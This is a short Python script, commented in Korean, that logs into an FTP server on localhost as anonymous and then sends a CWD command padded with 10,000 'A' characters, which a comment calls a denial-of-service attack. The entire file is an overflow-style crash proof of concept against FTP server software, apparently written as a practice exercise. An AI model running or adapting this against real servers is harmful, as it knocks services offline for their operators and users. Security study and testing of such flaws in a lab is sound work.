import socket

s = socket.socket()
addr = ("127.0.0.1", 21)
s.connect(addr)
data = s.recv(1024)
print("banner:", data.decode()) # 배너 출력

# 로그인 
s.send(b"USER anonymous")
data = s.recv(1024)
print(data.decode())

s.send(b"PASS anonymous")
data = s.recv(1024)
print(data.decode()) # 로그인 성공!

s.send(b"CWD " + b"A" * 10000)
data = s.recv(1024)
print(data.decode()) # dos공격

s.close()